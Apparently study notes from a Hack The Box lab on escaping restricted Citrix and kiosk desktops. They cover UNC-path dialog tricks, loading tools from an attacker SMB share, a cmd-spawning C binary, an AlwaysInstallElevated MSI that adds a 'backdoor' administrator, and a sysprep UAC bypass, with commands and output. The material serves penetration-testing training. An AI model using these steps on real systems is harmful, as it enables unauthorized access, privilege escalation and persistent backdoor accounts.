# Citrix Breakout

> [!info] Context
> Many orgs deploy restricted desktop environments (Citrix, Terminal Services, AWS AppStream, CyberArk PSM, Kiosk) to lock down what a remote user can do. Even with lock-down measures in place, it's often possible to "break out" of the restricted shell and reach a full command prompt.

## Basic Breakout Methodology

1. Gain access to a **Dialog Box** (via any app feature that opens one — Save, Open, Browse, Print, etc.)
2. Exploit the Dialog Box to achieve **command execution**
3. **Escalate privileges** to gain higher levels of access

> [!warning] Lock-down behavior
> In a highly restrictive environment, searching for `cmd.exe` or `powershell.exe` in the Start Menu returns nothing, and browsing to `C:\Windows\system32` in File Explorer throws an error. Getting a working command prompt in this state is a major win — it gives full information-gathering and privesc capability.

## Bypassing Path Restrictions

Browsing `C:\Users` via File Explorer is blocked by group policy:

> `Accessing the resource 'C:\Users' has been disallowed.'`

**Trick:** desktop apps with Save/Open/Browse/Import/Export/Search/Print/Help dialogs can be abused to invoke a Windows dialog box, which can then be pointed at a full UNC path to bypass the restriction.

### Example: MS Paint

1. Run **Paint** → **File > Open** to spawn the dialog box.
2. In the **File name** field, enter a UNC path with File-Type set to **All Files**:

```
\\127.0.0.1\c$\users\pmorgan
```

3. Hitting Enter grants access to that directory (e.g. `pmorgan\Downloads\flag.txt`).

## Accessing an SMB Share from the Restricted Environment

File Explorer blocks direct access to attacker-hosted SMB shares — but the same UNC-path trick via a dialog box works.

**On the attacking Linux box**, start an SMB server with Impacket:

```shellsession
root@ubuntu:/home/htb-student/Tools# smbserver.py -smb2support share $(pwd)

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

**Back in Citrix**, open Paint → File > Open, and enter:

```
\\10.13.38.95\share
```

with File-Type = All Files. This lists the share contents (`Bypass-UAC.ps1`, `Explorer++.exe`, `PowerUp.ps1`, `pwn.c`, `pwn.exe`).

> [!tip] Direct copy doesn't work
> File Explorer restrictions block copying files directly from the dialog box. Instead, **right-click the executable → Open** to launch it directly from the share.

`pwn.exe` is a small custom binary that spawns `cmd.exe`:

```c
#include <stdlib.h>
int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}
```

Once cmd access is obtained, files can be copied from the SMB share to the user's Desktop (e.g. via PowerShell with execution-policy bypass).

## Alternate Tools for Restricted Environments

| Restriction                    | Standard tool blocked | Workaround tool                                             |
| ------------------------------ | --------------------- | ----------------------------------------------------------- |
| File Explorer folder browsing  | `explorer.exe`        | **Explorer++**, **Q-Dir** (portable, no install needed)     |
| Registry Editor blocked by GPO | `regedit.exe`         | **SmallRegistryEditor**, **Uberregedit**, **Simpleregedit** |

> [!tip] Explorer++
> Recommended for its speed, ease of use, and portability — it runs directly with no installation, making it easy to move onto a restricted host and use immediately to copy files that File Explorer refuses to copy.

## Modifying an Existing Shortcut File

If a `.lnk` shortcut already exists on the Desktop:

1. Right-click the shortcut → **Properties**
2. Edit the **Target** field to point at `C:\Windows\System32\cmd.exe`
3. Run the shortcut — a cmd window spawns

If no shortcut is available,. One option is to transfer an existing shortcut file using an SMB server, or create a new one with PowerShell 
## Script Execution

If script extensions (`.bat`, `.vbs`, `.ps1`) are configured to auto-run through their interpreter, dropping a script is enough to get an interactive console:

1. Create a text file named `evil.bat`
2. Open it in Notepad and enter: `cmd`
3. Save and execute it — a Command Prompt window opens

## Escalating Privileges
tools like [Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) and [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) can also be employed to identify potential security issues and vulnerabilities within the operating system.
### AlwaysInstallElevated
Using `PowerUp.ps1`, we find that [Always Install Elevated](https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated) key is present and set.
Check with PowerUp, or manually via `reg query`:

```cmd
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
        AlwaysInstallElevated    REG_DWORD    0x1


C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
        AlwaysInstallElevated    REG_DWORD    0x1
```

> [!danger] Both keys must be `0x1`
> If **both** `HKCU` and `HKLM` `AlwaysInstallElevated` values are set to `1`, any user can install an `.msi` package with SYSTEM-level privileges.

Use PowerUp's `Write-UserAddMSI` to generate a malicious MSI that adds a backdoor admin user:

```powershell
PS C:\Users\pmorgan\Desktop> Import-Module .\PowerUp.ps1
PS C:\Users\pmorgan\Desktop> Write-UserAddMSI

Output Path
-----------
UserAdd.msi
```

Executing `UserAdd.msi` creates user `backdoor:T3st@123` under **Administrators**. (Password must meet complexity requirements or the MSI errors out.)

Switch to the new user:
Back in CMD execute `runas` to start command prompt as the newly created `backdoor` user.

```cmd
C:\> runas /user:backdoor cmd

Enter the password for backdoor: T3st@123
Attempting to start cmd as user "VDESKTOP3\backdoor" ...
```

### Bypassing UAC

Even as a member of **Administrators**, `backdoor` still can't reach `C:\Users\Administrator` due to UAC:
UAC is a security mechanism implemented in Windows to protect the operating system from unauthorized changes.

```cmd
C:\Windows\system32> cd C:\Users\Administrator

Access is denied.
```

Use a [UAC bypass](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC) script:

```powershell
PS C:\Users\Public> Import-Module .\Bypass-UAC.ps1
PS C:\Users\Public> Bypass-UAC -Method UacMethodSysprep
```

This impersonates `explorer.exe`, drops a proxy DLL, and executes `sysprep` to spawn a new elevated PowerShell window. Confirm with `whoami /all` or `whoami /priv` — the Administrator directory is now accessible.

> [!warning] Timing
> Wait ~5 minutes after spawning the target before starting. Ignore the licensing message that appears.
